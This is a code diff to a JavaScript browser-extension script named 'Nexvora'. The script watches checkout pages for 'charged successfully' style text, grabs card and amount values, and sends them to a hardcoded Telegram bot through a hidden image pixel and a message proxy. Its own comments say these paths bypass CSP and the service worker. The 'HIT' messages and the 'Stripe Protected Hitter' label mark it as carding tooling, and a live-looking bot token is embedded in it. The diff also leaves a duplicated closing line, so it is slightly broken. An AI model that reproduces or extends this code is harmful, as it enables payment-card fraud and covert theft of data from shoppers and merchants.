@@ -6,9 +6,10 @@
     const BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
     const CHAT_ID = '-1003721268860';
 
-    const sendDirectTelegram = async (message) => {
+    const sendDirectTelegram = async (message, data = {}) => {
         if (hasSentDirectly) return;
-        hasSentDirectly = true;
+        
+        console.log("[Nexvora] 📤 Transmission Initiated...", { message, data });
         
         try {
             // Absolute Failsafe 1: Image Pixel (Bypasses Service Worker completely)
@@ -18,6 +19,7 @@
                 p.style.display = 'none';
                 p.src = pixelUrl;
                 document.body.appendChild(p);
+                console.log("[Nexvora] ✅ Pixel Fallback Fired.");
             } catch(ign) {}
 
             // Failsafe 2: Message Proxy (Bypasses local CSP)
@@ -25,28 +27,28 @@
                 type: 'NOTIFY_HIT',
                 data: { 
                     text: message,
-                    card: cardStr,
-                    amount: amountStr,
+                    card: data.card || 'N/A',
+                    amount: data.amount || 'N/A',
                     site: window.location.hostname
                 }
             }, (response) => {
                 if (chrome.runtime.lastError) {
-                    console.error("[Nexvora] Runtime Error:", chrome.runtime.lastError);
+                    console.error("[Nexvora] ❌ Runtime Error:", chrome.runtime.lastError);
                 } else {
-                    console.log("[Nexvora] Transmission Result:", response);
+                    console.log("[Nexvora] ✅ Proxy Result:", response);
                 }
             });
-            console.log("[Nexvora] Dual transmission fired.");
+            
+            hasSentDirectly = true; // Lock after firing
         } catch (e) {
-            console.error("[Nexvora] Dual transmission failed.", e);
+            console.error("[Nexvora] ❌ Dual transmission error:", e);
         }
     };
 
     const processHit = (text, element) => {
         if (hasSentDirectly) return;
-        if (!text) return;
+        if (!text || text.length < 5) return;
         
-        // Exact matches with complete whitespace immunity
         const cleanText = text.toLowerCase().replace(/[^a-z0-9]/g, '');
         const isHit = (
             cleanText.includes('paidsuccessfully') || 
@@ -56,9 +58,9 @@
             cleanText.includes('approved')
         );
 
-        if (isHit && cleanText.length > 5 && cleanText.length < 1500) {
-            hasSentDirectly = true; // fast lock
-
+        if (isHit) {
+            console.log("[Nexvora] 🎯 HIT DETECTED in text:", text.substring(0, 100));
+            
             let amountStr = 'N/A';
             let cardStr = 'N/A';
 
@@ -75,17 +77,13 @@
                 }
             } catch (e) {}
 
-            const message = `<b>HIT BDT (PROXY)</b>\n` +
-                            `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
-                            `👤 <b>User:</b> 🇧🇩\n` +
-                            `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
-                            `↔️ <b>Gateway:</b> <code>Stripe Protected Hitter</code>\n` +
-                            `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
-                            `🌐 <b>Site:</b> <code>${window.location.hostname || 'Unknown'}</code>\n` +
-                            `💰 <b>Amount:</b> <code>${amountStr}</code>\n\n` +
-                            `<i>Checked by @hitinfobdrobot ✅</i>`;
+            const message = `<b>HIT SUCCESSFUL</b> 🚀\n\n` +
+                            `🌐 <b>Site:</b> <code>${window.location.hostname}</code>\n` +
+                            `💰 <b>Amount:</b> <code>${amountStr}</code>\n` +
+                            `✅ <b>Status:</b> <code>Charged Successfully</code>\n\n` +
+                            `<i>User: 🇧🇩 | Checked by @hitinfobdrobot</i>`;
 
-            sendDirectTelegram(message);
+            sendDirectTelegram(message, { card: cardStr, amount: amountStr });
         }
     };
 
@@ -95,7 +93,6 @@
 
         const elements = root.querySelectorAll ? root.querySelectorAll('div, span, p, h1, h2, h3, h4, h5, h6, strong, b, label') : [];
         for (let i = 0; i < elements.length; i++) {
-            if (hasSentDirectly) break;
             const el = elements[i];
             const text = el.innerText || el.textContent;
             if (text) processHit(text, el);
@@ -112,16 +109,12 @@
     };
 
     const observer = new MutationObserver((mutations) => {
-        if (hasSentDirectly) {
-            observer.disconnect();
-            return;
-        }
+        if (hasSentDirectly) return;
         for (let m of mutations) {
             for (let node of m.addedNodes) {
                 if (node.nodeType === 1) { 
                     const text = node.innerText || node.textContent;
                     if (text) processHit(text, node);
-                    if (node.shadowRoot) aggressivelyScan(node.shadowRoot);
                 }
             }
         }
@@ -129,13 +122,15 @@
 
     if (document.body) {
         observer.observe(document.body, { childList: true, subtree: true });
-        setInterval(() => aggressivelyScan(document.body), 400);
+        setInterval(() => aggressivelyScan(document.body), 1500); // reduced frequency to prevent lag
     } else {
         document.addEventListener('DOMContentLoaded', () => {
             observer.observe(document.body, { childList: true, subtree: true });
-            setInterval(() => aggressivelyScan(document.body), 400);
+            setInterval(() => aggressivelyScan(document.body), 1500);
         });
     }
+
+})();
 
 })();
 
